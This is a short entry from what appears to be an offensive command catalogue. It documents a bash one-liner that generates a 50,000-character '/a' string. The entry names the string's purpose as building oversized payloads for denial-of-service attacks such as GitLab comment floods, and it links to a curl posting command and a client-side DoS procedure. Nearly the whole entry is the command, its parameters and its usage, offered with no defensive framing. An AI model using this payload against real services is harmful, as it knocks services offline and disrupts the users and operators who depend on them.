---
data: head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g'
tags:
  - payload-generation
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:55.987Z'
id: 2545b5e9-547b-4f23-8ab6-548cc4399415
verified: false
validated: true
submitted: true
---
# head-sed-generate-payload

## Command

```bash
head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g'
```

## Description

This command generates a 50,000-character string of repeated '/a' by reading null bytes and substituting them, used for creating oversized payloads in DoS attacks like GitLab comment floods.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c 50000` | Read exactly 50,000 bytes | Yes |
| `/dev/zero` | Infinite null byte source | Yes |
| `s/\x00/\/a/g` | Global substitute null with '/a' | Yes |

## Examples

### Basic Usage

```bash
head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g'
```

### Advanced Usage

To pipe to file:
```bash
head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g' > payload.txt
```

## Expected Output

A continuous string of 50,000 '/a' characters, suitable for embedding in HTTP payloads.

## Related

- [[commands/curl-post-large-comment]]
- [[procedures/Trigger-Client-Side-DoS-with-Large-Comment]]
